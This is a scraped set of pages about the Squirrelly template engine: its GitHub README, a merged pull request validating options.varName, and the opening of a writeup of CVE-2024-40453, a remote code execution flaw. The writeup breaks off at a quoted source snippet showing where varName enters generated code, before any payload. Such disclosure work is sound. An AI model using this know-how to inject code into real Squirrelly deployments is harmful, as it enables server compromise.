=== Content from github.com_d6fee9d4_20250111_001513.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsquirrellyjs%2Fsquirrelly)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsquirrellyjs%2Fsquirrelly)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=squirrellyjs%2Fsquirrelly)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[squirrellyjs](/squirrellyjs)
/
**[squirrelly](/squirrellyjs/squirrelly)**
Public

* [Notifications](/login?return_to=%2Fsquirrellyjs%2Fsquirrelly) You must be signed in to change notification settings
* [Fork
  83](/login?return_to=%2Fsquirrellyjs%2Fsquirrelly)
* [Star
   649](/login?return_to=%2Fsquirrellyjs%2Fsquirrelly)

Semi-embedded JS template engine that supports helpers, filters, partials, and template inheritance. 4KB minzipped, written in TypeScript ⛺

[squirrelly.js.org](https://squirrelly.js.org "https://squirrelly.js.org")

### License

[MIT license](/squirrellyjs/squirrelly/blob/master/LICENSE)

[649
stars](/squirrellyjs/squirrelly/stargazers) [83
forks](/squirrellyjs/squirrelly/forks) [Branches](/squirrellyjs/squirrelly/branches) [Tags](/squirrellyjs/squirrelly/tags) [Activity](/squirrellyjs/squirrelly/activity)
 [Star](/login?return_to=%2Fsquirrellyjs%2Fsquirrelly)

 [Notifications](/login?return_to=%2Fsquirrellyjs%2Fsquirrelly) You must be signed in to change notification settings

* [Code](/squirrellyjs/squirrelly)
* [Issues
  16](/squirrellyjs/squirrelly/issues)
* [Pull requests
  6](/squirrellyjs/squirrelly/pulls)
* [Actions](/squirrellyjs/squirrelly/actions)
* [Projects
  0](/squirrellyjs/squirrelly/projects)
* [Wiki](/squirrellyjs/squirrelly/wiki)
* [Security](/squirrellyjs/squirrelly/security)
* [Insights](/squirrellyjs/squirrelly/pulse)

Additional navigation options

* [Code](/squirrellyjs/squirrelly)
* [Issues](/squirrellyjs/squirrelly/issues)
* [Pull requests](/squirrellyjs/squirrelly/pulls)
* [Actions](/squirrellyjs/squirrelly/actions)
* [Projects](/squirrellyjs/squirrelly/projects)
* [Wiki](/squirrellyjs/squirrelly/wiki)
* [Security](/squirrellyjs/squirrelly/security)
* [Insights](/squirrellyjs/squirrelly/pulse)

# squirrellyjs/squirrelly

    master[Branches](/squirrellyjs/squirrelly/branches)[Tags](/squirrellyjs/squirrelly/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[354 Commits](/squirrellyjs/squirrelly/commits/master/) | | |
| [.github](/squirrellyjs/squirrelly/tree/master/.github ".github") | | [.github](/squirrellyjs/squirrelly/tree/master/.github ".github") |  |  |
| [browser-tests](/squirrellyjs/squirrelly/tree/master/browser-tests "browser-tests") | | [browser-tests](/squirrellyjs/squirrelly/tree/master/browser-tests "browser-tests") |  |  |
| [examples](/squirrellyjs/squirrelly/tree/master/examples "examples") | | [examples](/squirrellyjs/squirrelly/tree/master/examples "examples") |  |  |
| [src](/squirrellyjs/squirrelly/tree/master/src "src") | | [src](/squirrellyjs/squirrelly/tree/master/src "src") |  |  |
| [test](/squirrellyjs/squirrelly/tree/master/test "test") | | [test](/squirrellyjs/squirrelly/tree/master/test "test") |  |  |
| [tools](/squirrellyjs/squirrelly/tree/master/tools "tools") | | [tools](/squirrellyjs/squirrelly/tree/master/tools "tools") |  |  |
| [.all-contributorsrc](/squirrellyjs/squirrelly/blob/master/.all-contributorsrc ".all-contributorsrc") | | [.all-contributorsrc](/squirrellyjs/squirrelly/blob/master/.all-contributorsrc ".all-contributorsrc") |  |  |
| [.editorconfig](/squirrellyjs/squirrelly/blob/master/.editorconfig ".editorconfig") | | [.editorconfig](/squirrellyjs/squirrelly/blob/master/.editorconfig ".editorconfig") |  |  |
| [.eslintrc.js](/squirrellyjs/squirrelly/blob/master/.eslintrc.js ".eslintrc.js") | | [.eslintrc.js](/squirrellyjs/squirrelly/blob/master/.eslintrc.js ".eslintrc.js") |  |  |
| [.gitignore](/squirrellyjs/squirrelly/blob/master/.gitignore ".gitignore") | | [.gitignore](/squirrellyjs/squirrelly/blob/master/.gitignore ".gitignore") |  |  |
| [.prettierignore](/squirrellyjs/squirrelly/blob/master/.prettierignore ".prettierignore") | | [.prettierignore](/squirrellyjs/squirrelly/blob/master/.prettierignore ".prettierignore") |  |  |
| [.prettierrc](/squirrellyjs/squirrelly/blob/master/.prettierrc ".prettierrc") | | [.prettierrc](/squirrellyjs/squirrelly/blob/master/.prettierrc ".prettierrc") |  |  |
| [.travis.yml](/squirrellyjs/squirrelly/blob/master/.travis.yml ".travis.yml") | | [.travis.yml](/squirrellyjs/squirrelly/blob/master/.travis.yml ".travis.yml") |  |  |
| [LICENSE](/squirrellyjs/squirrelly/blob/master/LICENSE "LICENSE") | | [LICENSE](/squirrellyjs/squirrelly/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/squirrellyjs/squirrelly/blob/master/README.md "README.md") | | [README.md](/squirrellyjs/squirrelly/blob/master/README.md "README.md") |  |  |
| [TODO.md](/squirrellyjs/squirrelly/blob/master/TODO.md "TODO.md") | | [TODO.md](/squirrellyjs/squirrelly/blob/master/TODO.md "TODO.md") |  |  |
| [distribution.md](/squirrellyjs/squirrelly/blob/master/distribution.md "distribution.md") | | [distribution.md](/squirrellyjs/squirrelly/blob/master/distribution.md "distribution.md") |  |  |
| [package.json](/squirrellyjs/squirrelly/blob/master/package.json "package.json") | | [package.json](/squirrellyjs/squirrelly/blob/master/package.json "package.json") |  |  |
| [rollup.config.ts](/squirrellyjs/squirrelly/blob/master/rollup.config.ts "rollup.config.ts") | | [rollup.config.ts](/squirrellyjs/squirrelly/blob/master/rollup.config.ts "rollup.config.ts") |  |  |
| [tsconfig.eslint.json](/squirrellyjs/squirrelly/blob/master/tsconfig.eslint.json "tsconfig.eslint.json") | | [tsconfig.eslint.json](/squirrellyjs/squirrelly/blob/master/tsconfig.eslint.json "tsconfig.eslint.json") |  |  |
| [tsconfig.json](/squirrellyjs/squirrelly/blob/master/tsconfig.json "tsconfig.json") | | [tsconfig.json](/squirrellyjs/squirrelly/blob/master/tsconfig.json "tsconfig.json") |  |  |
| [yarn.lock](/squirrellyjs/squirrelly/blob/master/yarn.lock "yarn.lock") | | [yarn.lock](/squirrellyjs/squirrelly/blob/master/yarn.lock "yarn.lock") |  |  |
| View all files | | |

## Repository files navigation

* README
* Code of conduct
* MIT license

[![Squirrel](https://camo.githubusercontent.com/b808f5564d151963c2fd8ecb4898edef83b9a0254eb1da0f566b881dece667fe/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f737175697272656c6c796a732f737175697272656c6c792d6c6f676f2f7376672d6d696e69666965642f737175697272656c6c792d6669742d61636f726e2e737667)](https://squirrelly.js.org)

# squirrelly

[Documentation](https://squirrelly.js.org) -
[Chat](https://gitter.im/squirrellyjs/Lobby) -
[RunKit Demo](https://npm.runkit.com/squirrelly) -
[Playground](https://squirrelly.js.org/playground)

[![GitHub package.json version (master)](https://camo.githubusercontent.com/e5ac56f8b0c9c6bcfef905b25caba02adf14363725cea943b415d4409dd3a0bc/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f7061636b6167652d6a736f6e2f762f737175697272656c6c796a732f737175697272656c6c792f6d61737465723f6c6162656c3d63757272656e7425323076657273696f6e)](https://camo.githubusercontent.com/e5ac56f8b0c9c6bcfef905b25caba02adf14363725cea943b415d4409dd3a0bc/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f7061636b6167652d6a736f6e2f762f737175697272656c6c796a732f737175697272656c6c792f6d61737465723f6c6162656c3d63757272656e7425323076657273696f6e)
[![Travis](https://camo.githubusercontent.com/f83d06bf3a35a976715cffbc5bba1f395a55deb7f60691f322d38a832855828c/68747470733a2f2f696d672e736869656c64732e696f2f7472617669732f636f6d2f737175697272656c6c796a732f737175697272656c6c792f6d61737465722e737667)](https://travis-ci.com/squirrellyjs/squirrelly)
[![All Contributors](https://camo.githubusercontent.com/f7b7a849179f3abdd8385767f3411caaf640523388e4ecfcff37d98fc51b9082/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f616c6c5f636f6e7472696275746f72732d352d6f72616e67652e737667 "Number of contributors on All-Contributors")](#contributors-)
[![Coveralls](https://camo.githubusercontent.com/80a0544e5ac2ce9a7ac4c33a5641058eabad20e62fa53f93af2cfaa98299ada0/68747470733a2f2f696d672e736869656c64732e696f2f636f766572616c6c732f737175697272656c6c796a732f737175697272656c6c792e737667)](https://coveralls.io/github/squirrellyjs/squirrelly)
[![Code Shelter](https://camo.githubusercontent.com/c48cb693f514862f02b6a1a4385bfdfcf5b8ce60a5b5136002a30f5bb5562c54/68747470733a2f2f7777772e636f64657368656c7465722e636f2f7374617469632f6261646765732f62616467652d666c61742e737667)](https://www.codeshelter.co/)
[![Donate](https://camo.githubusercontent.com/fe4ee853c92da2d3b975a94753dfa33070a6b6f0cdfc5c73e8725b022e63a6f9/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f646f6e6174652d70617970616c2d626c75652e737667)](https://paypal.me/bengubler)

**Summary**

Squirrelly is a modern, configurable, and blazing fast template engine implemented in JavaScript. It works out of the box with ExpressJS and the **full version** weighs only **~4KB gzipped**.

**This is version 8** - a new, more powerful rewrite of Squirrelly. It adds multiple features (like filter parameters, whitespace control, partials, and template inheritance) to bring you a template engine with the power of Nunjucks, the simplicity of EJS, and the small bundle size of its earlier versions.

Squirrelly v7 will continue to be maintained, and can be found at <https://github.com/squirrellyjs/squirrelly/tree/v7>.

[Read about the changes](https://squirrelly.js.org/blog/squirrelly-version-8)

*Looking for a [lightweight, faster, and more reliable](https://eta.js.org/docs/about/eta-vs-ejs) **alternative to EJS?** Check out Squirrelly's cousin, [Eta](https://eta.js.org).*

## Why Squirrelly?

Simply put, Squirrelly is super lightweight, super fast, super powerful, and super simple.

### 🌟 Features

* 🔧 Helpers, filters
* 🔧 Great error reporting
* 📦 0 dependencies
* 🔨 Conditionals
* 🔧 Better quotes/comments support
  + *ex. `{{someval + "name }}" }}`* compiles correctly, while it fails with DoT or EJS
* ⚡️ Exports ES Modules as well as UMD
* 🔨 Loops
* 🔧 Custom delimeters
* 📝 Easy template syntax
* 🔧 Precompilation
* 🔨 Partials
* 🔧 Inline JavaScript
* 🔨 Comments
* 🔧 Caching
* 🚀 Super Fast
  + Squirrelly [has been benchmarked](https://github.com/nebrelbug/squirrelly-benchmarks/tree/v8) against Marko, Pug, doT, Swig, Handlebars, Mustache, and Nunjucks. In each test, Squirrelly was fastest.
* ⚡️ Async support: async filters, helpers, partials
* 🔧 Template inheritance

## 📜 Docs

We know nobody reads through the long and boring documentation in the ReadMe anyway, so head over to the documentation website:

📝 <https://squirrelly.js.org>

## 📓 Examples

### Simple Template

```
var myTemplate = "<p>My favorite kind of cake is: {{it.favoriteCake}}</p>"

Sqrl.render(myTemplate, {favoriteCake: 'Chocolate!'})
// Returns: '<p>My favorite kind of cake is: Chocolate!</p>

```

### Conditionals

```
{{@if(it.somevalue === 1)}}
Display this
{{#else}}
Display this
{{/if}}

```

### Loops

```
{{@each(it.somearray) => val, index}}
Display this
The current array element is {{val}}
The current index is {{index}}
{{/each}}

```

## ✔️ Tests

Tests can be run with `npm test`. Multiple tests check that parsing, rendering, and compiling return expected results, formatting follows guidelines, and code coverage is at the expected level.

## Resources

To be added

## Projects using `squirrelly`

[Waiting for permissions]

* [Cypress](https://www.cypress.io/): Fast, easy and reliable testing for anything that runs in a browser
* [txAdmin](https://github.com/tabarra/txAdmin): A **full featured** web panel to manage & monitor your FiveM Server remotely, used by over two thousand servers worldwide
* [Add yours!](https://github.com/squirrellyjs/squirrelly/edit/master/README.md)

## Contributors

Made with ❤ by [@nebrelbug](https://github.com/nebrelbug) and all these wonderful contributors ([emoji key](https://github.com/kentcdodds/all-contributors#emoji-key)):

| [**Ben Gubler**](http://www.bengubler.com)[💻](https://github.com/squirrellyjs/squirrelly/commits?author=nebrelbug "Code") [💬](#question-nebrelbug "Answering Questions") [📖](https://github.com/squirrellyjs/squirrelly/commits?author=nebrelbug "Documentation") [⚠️](https://github.com/squirrellyjs/squirrelly/commits?author=nebrelbug "Tests") | [**Clite Tailor**](https://github.com/clitetailor)[🤔](#ideas-clitetailor "Ideas, Planning, & Feedback") [💻](https://github.com/squirrellyjs/squirrelly/commits?author=clitetailor "Code") | [**Ioan CHIRIAC**](https://twitter.com/ioan_chiriac)[💻](https://github.com/squirrellyjs/squirrelly/commits?author=ichiriac "Code") [🤔](#ideas-ichiriac "Ideas, Planning, & Feedback") | [**Lucas Wilson**](https://futurelucas4502.co.uk)[🐛](https://github.com/squirrellyjs/squirrelly/issues?q=author%3Afuturelucas4502 "Bug reports") [💻](https://github.com/squirrellyjs/squirrelly/commits?author=futurelucas4502 "Code") | [**Jon McLean**](https://github.com/jmclean-cnexus)[💻](https://github.com/squirrellyjs/squirrelly/commits?author=jmclean-cnexus "Code") [⚠️](https://github.com/squirrellyjs/squirrelly/commits?author=jmclean-cnexus "Tests") |
| --- | --- | --- | --- | --- |

*Note: because we completely rewrote Version 8 and it has a separate Git history, this chart excludes the dozens of contributors to Version 7. Their contributions are deeply appreciated and many of their ideas and code contributions are being used in Squirrelly v8. Many of their contributions can be found in the [v7 branch commit history](https://github.com/squirrellyjs/squirrelly/commits/v7).*

This project follows the [all-contributors](https://github.com/kentcdodds/all-contributors) specification. Contributions of any kind are welcome!

## Credits

* Async support and file handling were added based on code from [EJS](https://github.com/mde/ejs), which is licensed under the Apache-2.0 license. Code was modified to throw informative errors and work with Squirrelly's API

## About

Semi-embedded JS template engine that supports helpers, filters, partials, and template inheritance. 4KB minzipped, written in TypeScript ⛺

[squirrelly.js.org](https://squirrelly.js.org "https://squirrelly.js.org")

### Topics

[nodejs](/topics/nodejs "Topic: nodejs")
[javascript](/topics/javascript "Topic: javascript")
[typescript](/topics/typescript "Topic: typescript")
[template-engine](/topics/template-engine "Topic: template-engine")
[handlebars](/topics/handlebars "Topic: handlebars")
[npm-package](/topics/npm-package "Topic: npm-package")
[pug](/topics/pug "Topic: pug")
[template-inheritance](/topics/template-inheritance "Topic: template-inheritance")
[expressjs-templating-engine](/topics/expressjs-templating-engine "Topic: expressjs-templating-engine")
[ejs-alternative](/topics/ejs-alternative "Topic: ejs-alternative")

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)
### Code of conduct

[Code of conduct](#coc-ov-file)

[Activity](/squirrellyjs/squirrelly/activity)
[Custom properties](/squirrellyjs/squirrelly/custom-properties)
### Stars

[**649**
stars](/squirrellyjs/squirrelly/stargazers)
### Watchers

[**13**
watching](/squirrellyjs/squirrelly/watchers)
### Forks

[**83**
forks](/squirrellyjs/squirrelly/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fsquirrellyjs%2Fsquirrelly&report=squirrellyjs+%28user%29)

## [Releases 38](/squirrellyjs/squirrelly/releases)

[Version 9.1.0
Latest

Jul 2, 2024](/squirrellyjs/squirrelly/releases/tag/v9.1.0)
[+ 37 releases](/squirrellyjs/squirrelly/releases)

## Sponsor this project

* <https://paypal.me/bengubler>

[Learn more about GitHub Sponsors](/sponsors)

## [Packages 0](/orgs/squirrellyjs/packages?repo_name=squirrelly)

No packages published

## [Contributors 8](/squirrellyjs/squirrelly/graphs/contributors)

## Languages

* [TypeScript
  75.6%](/squirrellyjs/squirrelly/search?l=typescript)
* [JavaScript
  13.6%](/squirrellyjs/squirrelly/search?l=javascript)
* [HTML
  10.8%](/squirrellyjs/squirrelly/search?l=html)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_d8ab4c12_20250111_001514.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsquirrellyjs%2Fsquirrelly%2Fpull%2F262)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsquirrellyjs%2Fsquirrelly%2Fpull%2F262)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=squirrellyjs%2Fsquirrelly)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[squirrellyjs](/squirrellyjs)
/
**[squirrelly](/squirrellyjs/squirrelly)**
Public

* [Notifications](/login?return_to=%2Fsquirrellyjs%2Fsquirrelly) You must be signed in to change notification settings
* [Fork
  83](/login?return_to=%2Fsquirrellyjs%2Fsquirrelly)
* [Star
   649](/login?return_to=%2Fsquirrellyjs%2Fsquirrelly)

* [Code](/squirrellyjs/squirrelly)
* [Issues
  16](/squirrellyjs/squirrelly/issues)
* [Pull requests
  6](/squirrellyjs/squirrelly/pulls)
* [Actions](/squirrellyjs/squirrelly/actions)
* [Projects
  0](/squirrellyjs/squirrelly/projects)
* [Wiki](/squirrellyjs/squirrelly/wiki)
* [Security](/squirrellyjs/squirrelly/security)
* [Insights](/squirrellyjs/squirrelly/pulse)

Additional navigation options

* [Code](/squirrellyjs/squirrelly)
* [Issues](/squirrellyjs/squirrelly/issues)
* [Pull requests](/squirrellyjs/squirrelly/pulls)
* [Actions](/squirrellyjs/squirrelly/actions)
* [Projects](/squirrellyjs/squirrelly/projects)
* [Wiki](/squirrellyjs/squirrelly/wiki)
* [Security](/squirrellyjs/squirrelly/security)
* [Insights](/squirrellyjs/squirrelly/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fsquirrellyjs%2Fsquirrelly%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fsquirrellyjs%2Fsquirrelly%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# check that options.varName is a valid JS identifier #262

 Merged

[nebrelbug](/nebrelbug)
merged 1 commit into
[squirrellyjs:master](/squirrellyjs/squirrelly/tree/master "squirrellyjs/squirrelly:master")
from
[samuzora:master](/samuzora/squirrelly/tree/master "samuzora/squirrelly:master")

Jul 2, 2024

 Merged

# [check that options.varName is a valid JS identifier](#top) #262

[nebrelbug](/nebrelbug)
merged 1 commit into
[squirrellyjs:master](/squirrellyjs/squirrelly/tree/master "squirrellyjs/squirrelly:master")
from
[samuzora:master](/samuzora/squirrelly/tree/master "samuzora/squirrelly:master")

Jul 2, 2024

[Conversation
2](/squirrellyjs/squirrelly/pull/262)
[Commits
1](/squirrellyjs/squirrelly/pull/262/commits)
[Checks
2](/squirrellyjs/squirrelly/pull/262/checks)
[Files changed](/squirrellyjs/squirrelly/pull/262/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![samuzora](https://avatars.githubusercontent.com/u/57425222?s=60&v=4)](/samuzora)

Copy link

Contributor

### @samuzora **[samuzora](/samuzora)** commented [Jun 30, 2024](#issue-2382506358)

Add a filter to check that options.varName is a valid JS identifier

Sorry, something went wrong.

All reactions

[![@samuzora](https://avatars.githubusercontent.com/u/57425222?s=40&v=4)](/samuzora)

`[fix: check that options.varName is a valid JS identifier](/squirrellyjs/squirrelly/pull/262/commits/8b1aed93889a64489d82ece2d69f5f78d2cdc959 "fix: check that options.varName is a valid JS identifier")`

`[8b1aed9](/squirrellyjs/squirrelly/pull/262/commits/8b1aed93889a64489d82ece2d69f5f78d2cdc959)`

[![@nebrelbug](https://avatars.githubusercontent.com/u/25597854?s=80&u=4c054d65052a40766be12bc7b304283d53d9e667&v=4)](/nebrelbug)

Copy link

Collaborator

### **[nebrelbug](/nebrelbug)** commented [Jul 2, 2024](#issuecomment-2201589894)

| Looks good, thanks! |
| --- |

All reactions

Sorry, something went wrong.

 Hide details
View details

[![@nebrelbug](https://avatars.githubusercontent.com/u/25597854?s=40&u=4c054d65052a40766be12bc7b304283d53d9e667&v=4)](/nebrelbug)
[nebrelbug](/nebrelbug)
merged commit [`426f930`](/squirrellyjs/squirrelly/commit/426f930e5ca1501404cd887071e734ec5feb0bcf)
into
squirrellyjs:master

[Jul 2, 2024](https://github.com/squirrellyjs/squirrelly/pull/262#event-13358208495)
1 check passed

[![@nebrelbug](https://avatars.githubusercontent.com/u/25597854?s=80&u=4c054d65052a40766be12bc7b304283d53d9e667&v=4)](/nebrelbug)

Copy link

Collaborator

### **[nebrelbug](/nebrelbug)** commented [Jul 2, 2024](#issuecomment-2201601964)

| Released in <https://github.com/squirrellyjs/squirrelly/releases/tag/v9.1.0> |
| --- |

All reactions

Sorry, something went wrong.

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fsquirrellyjs%2Fsquirrelly%2Fpull%2F262)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@samuzora](https://avatars.githubusercontent.com/u/57425222?s=52&v=4)](/samuzora) [![@nebrelbug](https://avatars.githubusercontent.com/u/25597854?s=52&v=4)](/nebrelbug)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from samuzora.com_2b771eb2_20250111_001514.html ===
      [samuzora.com](/)    [HOME](/)  [BLOG](/browse)
Contents

* [Technical details](#technical-details)

+ [Initial findings](#initial-findings)

+ [Testing](#testing)

+ [First payload](#first-payload)

+ [Better payloads](#better-payloads)

* [Timeline](#timeline)

+ [Remediation](#remediation)

      Squirrelly v9.0.0 RCE (CVE-2024-40453)![author](/assets/samuzora.png) samuzora  17 Jul 2024 CVEs web 6 min read
Contents

* [Technical details](#technical-details)

+ [Initial findings](#initial-findings)

+ [Testing](#testing)

+ [First payload](#first-payload)

+ [Better payloads](#better-payloads)

* [Timeline](#timeline)

+ [Remediation](#remediation)

This is a writeup for CVE-2024-40453.

# Technical details

## Initial findings

When looking through the Squirrelly source code, [OwOverflow](https://github.com/molangning) pointed out this segment of code in
[`src/compile-string.ts`](https://github.com/squirrellyjs/squirrelly/blob/5eae86154a03d0716c2525ab9e50d9adb318abe6/src/compile-string.ts#L17)
to me:

```
  var res =
    "var tR='';" +
    (env.useWith ? 'with(' + env.varName + '||{}){' : '') +
